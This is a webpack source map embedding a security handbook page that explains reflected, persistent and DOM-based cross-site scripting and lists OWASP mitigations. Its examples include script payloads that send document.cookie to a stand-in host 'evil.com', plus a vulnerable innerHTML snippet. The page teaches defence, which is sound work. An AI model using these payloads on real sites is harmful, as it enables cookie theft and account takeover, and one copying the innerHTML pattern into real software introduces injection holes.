{"version":3,"sources":["webpack:///../public/pxss.png","webpack:///../src/attacks_explained/xss.mdx","webpack:///../public/rxss.png","webpack:///../public/dom_xss.png"],"names":["module","exports","_frontmatter","layoutProps","MDXLayout","DefaultLayout","MDXContent","components","props","mdxType","width","height","src","alt","require","parentName","isMDXComponent"],"mappings":"iFAAAA,EAAOC,QAAU,IAA0B,oD,ybCMpC,IAAMC,EAAe,Q,+MAE5B,IAKMC,EAAc,CAClBD,gBAEIE,EAAYC,IACH,SAASC,EAAT,GAGZ,IAFDC,EAEC,EAFDA,WACGC,E,oIACF,mBACD,OAAO,YAACJ,EAAD,KAAeD,EAAiBK,EAAhC,CAAuCD,WAAYA,EAAYE,QAAQ,cAG5E,iBAAQ,CACN,GAAM,4BADR,8BAGA,iBAAQ,CACN,GAAM,cADR,cAGA,sBAAQC,MAAM,OAAOC,OAAO,MAAMC,IAAI,8CAEtC,iBAAQ,CACN,GAAM,iBADR,iBAGA,qBAAG,mBAAKC,IAAI,gCAAgCD,IAAKE,EAAQ,UAAzD,KACF,kBAAIC,WAAW,KAAf,cAAkC,mBAAGA,WAAW,MAAS,CACjD,KAAQ,iFADkB,yBAGhC,iBAAQ,CACN,GAAM,QADR,QAGA,sBACE,kBAAIA,WAAW,MAAf,uFAEF,iBAAQ,CACN,GAAM,WADR,WAGA,mGACA,uBAAK,sBAAMA,WAAW,OAAU,IAA3B,gHAEL,sIACA,kGACA,iBAAQ,CACN,GAAM,kBADR,kBAGA,qBAAG,mBAAKF,IAAI,wBAAwBD,IAAKE,EAAQ,UAAjD,KACF,kBAAIC,WAAW,KAAf,cAAkC,mBAAGA,WAAW,MAAS,CACjD,KAAQ,kFADkB,yBAGhC,iBAAQ,CACN,GAAM,UADR,QAGA,wJACA,sBACE,kBAAIA,WAAW,MAAf,qGACA,kBAAIA,WAAW,MAAf,oIAEF,sFACA,iBAAQ,CACN,GAAM,aADR,WAGA,mGACA,uBAAK,sBAAMA,WAAW,OAAU,IAA3B,sIAEL,mHACA,iBAAQ,CACN,GAAM,WADR,WAGA,qBAAG,mBAAKF,IAAI,0BAA0BD,IAAKE,EAAQ,UAAnD,KACF,kBAAIC,WAAW,KAAf,cAAkC,mBAAGA,WAAW,MAAS,CACjD,KAAQ,mFADkB,yBAGhC,iBAAQ,CACN,GAAM,UADR,QAGA,8GACA,uBAAK,sBAAMA,WAAW,OAAU,CAC5B,UAAa,gBADZ,6IAKL,uBAAK,sBAAMA,WAAW,OAAU,IAA3B,qEAEL,iBAAQ,CACN,GAAM,qBADR,qBAGA,sBACE,kBAAIA,WAAW,MAAK,mBAAGA,WAAW,MAAS,CACvC,KAAQ,gHADQ,qEAGpB,kBAAIA,WAAW,MAAK,mBAAGA,WAAW,MAAS,CACvC,KAAQ,iGADQ,+DAItB,iBAAQ,CACN,GAAM,gBADR,gBAGA,+GACA,iBAAQ,CACN,GAAM,cADR,cAGA,iBAAQ,CACN,GAAM,wCACL,mBAAGA,WAAW,MAAS,CACtB,KAAQ,oGADT,yCAGH,sBACE,kBAAIA,WAAW,MAAf,+DACA,kBAAIA,WAAW,MAAf,6EACA,kBAAIA,WAAW,MAAf,oFACA,kBAAIA,WAAW,MAAf,qFACA,kBAAIA,WAAW,MAAf,2EAAgG,0BAAYA,WAAW,MAAvB,eAChG,kBAAIA,WAAW,MAAf,wGACA,kBAAIA,WAAW,MAAf,iFACA,kBAAIA,WAAW,MAAf,gEACA,kBAAIA,WAAW,MAAf,+BAEF,iBAAQ,CACN,GAAM,4CACL,mBAAGA,WAAW,MAAS,CACtB,KAAQ,6FADT,6CAGH,sBACE,kBAAIA,WAAW,MAAf,4HACA,kBAAIA,WAAW,MAAf,qHACA,kBAAIA,WAAW,MAAf,mIACA,kBAAIA,WAAW,MAAf,wHACA,kBAAIA,WAAW,MAAf,oIACA,kBAAIA,WAAW,MAAf,sEACA,kBAAIA,WAAW,MAAf,wDAEF,iBAAQ,CACN,GAAM,SADR,SAGA,sBACE,kBAAIA,WAAW,MAAf,OAA4B,mBAAGA,WAAW,MAAS,CAC/C,KAAQ,0CADgB,mDAG5B,kBAAIA,WAAW,MAAf,OAA4B,mBAAGA,WAAW,MAAS,CAC/C,KAAQ,mDADgB,6CAG5B,kBAAIA,WAAW,MAAf,OAA4B,mBAAGA,WAAW,MAAS,CAC/C,KAAQ,iDADgB,4CAI9B,iBAAQ,CACN,GAAM,QADR,QAGA,sBACE,kBAAIA,WAAW,MAAK,mBAAGA,WAAW,MAAS,CACvC,KAAQ,8GADQ,2EAGpB,kBAAIA,WAAW,MAAK,mBAAGA,WAAW,MAAS,CACvC,KAAQ,uGADQ,6CAGpB,kBAAIA,WAAW,MAAK,mBAAGA,WAAW,MAAS,CACvC,KAAQ,8DADQ,uCAGpB,kBAAIA,WAAW,MAAK,mBAAGA,WAAW,MAAS,CACvC,KAAQ,kFADQ,qDAGpB,kBAAIA,WAAW,MAAK,mBAAGA,WAAW,MAAS,CACvC,KAAQ,mFADQ,sDAGpB,kBAAIA,WAAW,MAAK,mBAAGA,WAAW,MAAS,CACvC,KAAQ,iFADQ,oDAGpB,kBAAIA,WAAW,MAAK,mBAAGA,WAAW,MAAS,CACvC,KAAQ,gDADQ,uE,6MAQ1BT,EAAWU,gBAAiB,G,qBC1L5BhB,EAAOC,QAAU,IAA0B,oD,qBCA3CD,EAAOC,QAAU,IAA0B","file":"component---src-attacks-explained-xss-mdx-c23d23846ff299040f0d.js","sourcesContent":["module.exports = __webpack_public_path__ + \"static/pxss-2c765ca8f06ad783d20681e8219af615.png\";","import * as React from 'react'\n  /* @jsx mdx */\nimport { mdx } from '@mdx-js/react';\n/* @jsx mdx */\n\nimport DefaultLayout from \"/Users/ulisesgascon/Desktop/WORKSPACE/GS-Projects/cybersecurity-handbook/node_modules/gatsby-theme-docz/src/base/Layout.js\";\nexport const _frontmatter = {};\n\nconst makeShortcode = name => function MDXDefaultShortcode(props) {\n  console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n  return <div {...props} />;\n};\n\nconst layoutProps = {\n  _frontmatter\n};\nconst MDXLayout = DefaultLayout;\nexport default function MDXContent({\n  components,\n  ...props\n}) {\n  return <MDXLayout {...layoutProps} {...props} components={components} mdxType=\"MDXLayout\">\n\n\n    <h1 {...{\n      \"id\": \"cross-site-scripting-xss\"\n    }}>{`Cross-site scripting (XSS)`}</h1>\n    <h2 {...{\n      \"id\": \"the-attack\"\n    }}>{`The Attack`}</h2>\n    <iframe width=\"100%\" height=\"450\" src=\"https://www.youtube.com/embed/L5l9lSnNMxg\">\n    </iframe>\n    <h2 {...{\n      \"id\": \"reflected-xss\"\n    }}>{`Reflected XSS`}</h2>\n    <p><img alt=\"Reflected XSS sample workflow\" src={require(\"../../public/rxss.png\")} />{`\n`}<em parentName=\"p\">{`Image from `}<a parentName=\"em\" {...{\n          \"href\": \"https://medium.com/iocscan/reflected-cross-site-scripting-r-xss-b06c3e8d638a\"\n        }}>{`Christopher Makarem`}</a></em></p>\n    <h3 {...{\n      \"id\": \"keys\"\n    }}>{`Keys`}</h3>\n    <ul>\n      <li parentName=\"ul\">{`The Attack is focused on the user input like crafted urls with mailicious payload.`}</li>\n    </ul>\n    <h3 {...{\n      \"id\": \"example\"\n    }}>{`Example`}</h3>\n    <p>{`It is very simple to add a malicious payload in a vulnerable website link.`}</p>\n    <pre><code parentName=\"pre\" {...{}}>{`http://website.com/search?keyword=<script>window.location='http://evil.com/?c='+document.cookie</script>\n`}</code></pre>\n    <p>{`The victim will open this link and will be redirected to a malicious site with the cookie content in the URL.`}</p>\n    <p>{`Inside the malicious code we can add extra payloads like (ajax calls... )`}</p>\n    <h2 {...{\n      \"id\": \"persistent-xss\"\n    }}>{`persistent XSS`}</h2>\n    <p><img alt=\"p-XSS sample workflow\" src={require(\"../../public/pxss.png\")} />{`\n`}<em parentName=\"p\">{`Image from `}<a parentName=\"em\" {...{\n          \"href\": \"https://medium.com/iocscan/persistent-cross-site-scripting-p-xss-557c70377554\"\n        }}>{`Christopher Makarem`}</a></em></p>\n    <h3 {...{\n      \"id\": \"keys-1\"\n    }}>{`Keys`}</h3>\n    <p>{`Also known as stored XSS. The malicious script comes from the website's database, so this attack requires few steps to succeed.`}</p>\n    <ul>\n      <li parentName=\"ul\">{`In the first step the attacker will add a malicious payload to the server (so it will be stored).`}</li>\n      <li parentName=\"ul\">{`Later on the victims will access to the site and the malicious payload will be downloaded together with the legitimate content.`}</li>\n    </ul>\n    <p>{`This attack can lead to Cookie theft, KeyLogging, Phishing...`}</p>\n    <h3 {...{\n      \"id\": \"example-1\"\n    }}>{`Example`}</h3>\n    <p>{`The attacker adds a malicious payload in the comments section of the site.`}</p>\n    <pre><code parentName=\"pre\" {...{}}>{`POST \"http://website.com/blog/post-1/comment\", body{\"<script>window.location='http://evil.com/?c='+document.cookie</script>}\n`}</code></pre>\n    <p>{`Any user that visits the website will be vulnerable once this malicious comment is loaded.`}</p>\n    <h2 {...{\n      \"id\": \"dom-xss\"\n    }}>{`DOM XSS`}</h2>\n    <p><img alt=\"DOM-XSS sample workflow\" src={require(\"../../public/dom_xss.png\")} />{`\n`}<em parentName=\"p\">{`Image from `}<a parentName=\"em\" {...{\n          \"href\": \"https://medium.com/iocscan/dom-based-cross-site-scripting-dom-xss-3396453364fd\"\n        }}>{`Christopher Makarem`}</a></em></p>\n    <h3 {...{\n      \"id\": \"keys-2\"\n    }}>{`Keys`}</h3>\n    <p>{`If the attacker controls any input field value, they can easily add malicious values:`}</p>\n    <pre><code parentName=\"pre\" {...{\n        \"className\": \"language-js\"\n      }}>{`const search = document.getElementById('search').value;\ndocument.getElementById('results').innerHTML = \\`You searched for: \\${search}\\`;\n`}</code></pre>\n    <pre><code parentName=\"pre\" {...{}}>{`You searched for: <img src=error onerror='/* Evil payload */'>\n`}</code></pre>\n    <h3 {...{\n      \"id\": \"notable-incidents\"\n    }}>{`Notable incidents`}</h3>\n    <ul>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://www.telegraph.co.uk/technology/twitter/10894635/BBC-and-White-House-accounts-in-TweetDeck-hack.html\"\n        }}>{`The Telegraph | TweetDeck hack hits BBC and White House accounts`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://www.vice.com/en_us/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever\"\n        }}>{`VICE |Â The MySpace Worm that Changed the Internet Forever`}</a></li>\n    </ul>\n    <h2 {...{\n      \"id\": \"the-solution\"\n    }}>{`The solution`}</h2>\n    <p>{`There are no definitive solutions to avoid this attack but it can be highly mitigated.`}</p>\n    <h2 {...{\n      \"id\": \"mitigation\"\n    }}>{`Mitigation`}</h2>\n    <h3 {...{\n      \"id\": \"keys-from-owasp-cheat-sheets-for-xss\"\n    }}><a parentName=\"h3\" {...{\n        \"href\": \"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\"\n      }}>{`Keys from OWASP Cheat sheets for XSS`}</a></h3>\n    <ul>\n      <li parentName=\"ul\">{`0 - Never Insert Untrusted Data Except in Allowed Locations`}</li>\n      <li parentName=\"ul\">{`1 - HTML Escape Before Inserting Untrusted Data into HTML Element Content`}</li>\n      <li parentName=\"ul\">{`2 - Attribute Escape Before Inserting Untrusted Data into HTML Common Attributes`}</li>\n      <li parentName=\"ul\">{`3 - JavaScript Escape Before Inserting Untrusted Data into JavaScript Data Values`}</li>\n      <li parentName=\"ul\">{`3.1 - HTML escape JSON values in an HTML context and read the data with `}<inlineCode parentName=\"li\">{`JSON.parse`}</inlineCode></li>\n      <li parentName=\"ul\">{`4 - CSS Escape And Strictly Validate Before Inserting Untrusted Data into HTML Style Property Values`}</li>\n      <li parentName=\"ul\">{`5 - URL Escape Before Inserting Untrusted Data into HTML URL Parameter Values`}</li>\n      <li parentName=\"ul\">{`6 - Sanitize HTML Markup with a Library Designed for the Job`}</li>\n      <li parentName=\"ul\">{`7 - Avoid JavaScript URL's`}</li>\n    </ul>\n    <h3 {...{\n      \"id\": \"keys-from-owasp-cheat-sheets-for-dom-xss\"\n    }}><a parentName=\"h3\" {...{\n        \"href\": \"https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html\"\n      }}>{`Keys from OWASP Cheat sheets for DOM XSS`}</a></h3>\n    <ul>\n      <li parentName=\"ul\">{`1 - HTML Escape then JavaScript Escape Before Inserting Untrusted Data into HTML Subcontext within the Execution Context`}</li>\n      <li parentName=\"ul\">{`2 - JavaScript Escape Before Inserting Untrusted Data into HTML Attribute Subcontext within the Execution Context`}</li>\n      <li parentName=\"ul\">{`3 - Be Careful when Inserting Untrusted Data into the Event Handler and JavaScript code Subcontexts within an Execution Context`}</li>\n      <li parentName=\"ul\">{`4 - JavaScript Escape Before Inserting Untrusted Data into the CSS Attribute Subcontext within the Execution Context`}</li>\n      <li parentName=\"ul\">{`5 - URL Escape then JavaScript Escape Before Inserting Untrusted Data into URL Attribute Subcontext within the Execution Context`}</li>\n      <li parentName=\"ul\">{`6 - Populate the DOM using safe JavaScript functions or properties`}</li>\n      <li parentName=\"ul\">{`7 - Fixing DOM Cross-site Scripting Vulnerabilities`}</li>\n    </ul>\n    <h3 {...{\n      \"id\": \"other\"\n    }}>{`Other`}</h3>\n    <ul>\n      <li parentName=\"ul\">{`The `}<a parentName=\"li\" {...{\n          \"href\": \"/cybersecurity-handbook/http_headers/\"\n        }}>{`Recommendations for HTTP Headers in this guide`}</a></li>\n      <li parentName=\"ul\">{`The `}<a parentName=\"li\" {...{\n          \"href\": \"/cybersecurity-handbook/best_practices/express\"\n        }}>{`Best practices for Express in this guide`}</a></li>\n      <li parentName=\"ul\">{`The `}<a parentName=\"li\" {...{\n          \"href\": \"/cybersecurity-handbook/best_practices/react\"\n        }}>{`Best practices for React in this guide`}</a></li>\n    </ul>\n    <h3 {...{\n      \"id\": \"refs\"\n    }}>{`Refs`}</h3>\n    <ul>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://speakerdeck.com/ckarande/top-overlooked-security-threats-to-node-dot-js-web-applications?slide=24\"\n        }}>{`ckarande |Â Top Overlooked Security Threats to Node.js Web Applications`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"http://scottksmith.com/blog/2015/06/22/secure-node-apps-against-owasp-top-10-cross-site-scripting/\"\n        }}>{`Scott Smith | Cross Site Scripting (XSS)`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://portswigger.net/web-security/cross-site-scripting\"\n        }}>{`portswigger |Â Cross-site scripting`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://medium.com/iocscan/persistent-cross-site-scripting-p-xss-557c70377554\"\n        }}>{`Medium |Â Persistent Cross Site Scripting (p-XSS)`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://medium.com/iocscan/dom-based-cross-site-scripting-dom-xss-3396453364fd\"\n        }}>{`Medium | DOM-Based Cross Site Scripting (DOM-XSS)`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://medium.com/iocscan/reflected-cross-site-scripting-r-xss-b06c3e8d638a\"\n        }}>{`Medium |Â Reflected Cross Site Scripting (r-XSS)`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://www.youtube.com/watch?v=L5l9lSnNMxg\"\n        }}>{`Computerphile |Â Cracking Websites with Cross Site Scripting`}</a></li>\n    </ul>\n\n    </MDXLayout>;\n}\n;\nMDXContent.isMDXComponent = true;\n      ","module.exports = __webpack_public_path__ + \"static/rxss-d836aaa5447f630867eb0a9256f788d8.png\";","module.exports = __webpack_public_path__ + \"static/dom_xss-626500311c72c41d42a47f48f5dbfd9e.png\";"],"sourceRoot":""}